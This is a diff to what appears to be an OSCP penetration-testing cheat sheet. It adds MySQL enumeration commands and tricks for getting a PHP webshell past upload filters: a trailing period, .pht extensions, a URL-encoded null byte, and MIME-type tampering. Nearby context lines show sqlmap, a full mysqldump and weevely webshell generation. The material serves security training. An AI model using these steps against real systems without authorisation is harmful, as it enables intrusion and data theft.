@@ -318,6 +318,12 @@ sqlmap -u “http://XX.XX.XX.XX/app.php” -b --random-agent --fresh-queries (--
 
 mysqldump --user=root --password=[pass] --host=[ip] --port=[port] --all-databases  
 
+mysql -u root -p root
+SHOW DATABASES;
+USE [database];
+SHOW TABLES;
+SELECT * FROM [table];
+
 
 **NoSQLMap Examples**
 You may encounter NoSQL instances like MongoDB in your OSCP journey (`/cgi-bin/mongo/2.2.3/dbparse.py`).  NoSQLMap can help you to automate NoSQLDatabase enumeration.
@@ -874,7 +880,8 @@ weevely generate password1234 shell.php      (upload this obfuscated webshell)
 
 pentestmonkey has a great php reverse shell
 
-sometimes web apps filter php uploads, you can sometimes bypass them using lesser known extensions like .pht, 
+sometimes web apps filter php uploads, you can sometimes bypass them using a period (shell.php.) also using lesser known extensions like .pht 
+Use a null byte in URL encoding to "escape" the extra junk after .php extension (%00) if in a web browser
 or use burpsuite/tamper and change the MIME type to something acceptable (octet-stream, pdf, etc)
 
 
